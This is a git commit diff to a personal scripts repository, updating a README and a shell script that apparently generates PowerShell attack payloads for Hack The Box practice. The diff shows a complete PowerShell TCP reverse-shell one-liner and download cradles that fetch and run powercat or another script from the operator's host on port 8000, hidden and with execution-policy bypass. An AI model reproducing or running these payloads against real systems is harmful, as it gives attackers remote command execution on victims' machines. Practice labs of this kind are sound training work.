2e8d6dfe8f776160d67c421bb9bf54f7125e9109
Mojo8898 <zmewshaw@gmail.com>
2024-01-20 23:30:56 -0500

    Updated

--- README.md
+++ README.md
@@ -1,2 +1,9 @@
 # scripts
+
 These are some of the scripts that I use regularly
+
+## Install
+
+```bash
+git clone https://github.com/Mojo8898/scripts.git "$HOME/scripts"
+```
--- htb/ps_cradle_gen.sh
+++ htb/ps_cradle_gen.sh
@@ -17,7 +17,7 @@ fi
 
 shell="\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
 
-echo -e "\n<== IEX methods ==>\n"
+echo -e "\n<== IEX methods (use powercat for interactive shell) ==>\n"
 echo -e "powershell -nop -w hidden -noni -ep bypass -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:8000/powercat.ps1');powercat -c $ip -p $port -e powershell\"\n"
 echo "powershell -nop -w hidden -noni -ep bypass -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:8000/hehe.ps1')\""
 
